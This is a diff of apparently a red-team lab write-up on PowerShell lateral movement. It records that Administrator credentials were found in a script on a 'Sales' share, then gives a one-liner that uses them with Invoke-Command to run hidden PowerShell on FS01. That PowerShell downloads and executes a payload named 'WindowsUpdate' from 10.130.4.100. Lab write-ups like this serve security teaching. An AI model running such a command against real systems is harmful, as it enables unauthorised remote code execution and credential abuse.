@@ -22,7 +22,7 @@ Keep in mind that we are using PowerShell for lateral movement in this case, and
 ![[Pasted image 20240411234042.png]]
 
 Let's construct our PowerShell OneLiner. We will create alternate credentials and pass those along with our Invoke-Command to execute our payload on FS01 
-- Note: We got Administrator creds stored in `troubleshooting.ps1` PS file, 
+- Note: We got Administrator creds stored in `troubleshooting.ps1` PS file. These were found stored in the 'Sales' share accessible to the low priviledge user we compromise
 
 ```powershell
 powershell $pspassword=ConvertTo-SecureString "sup3rs3cr3tP@ssw0rd!!" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential("FS01\Administrator",$pspassword);Invoke-Command -ComputerName fs01 -Credential $cred -ScriptBlock {powershell.exe -nop -w hidden -c "IEX(irm -useb 'http://10.130.4.100:8888/WindowsUpdate')"}
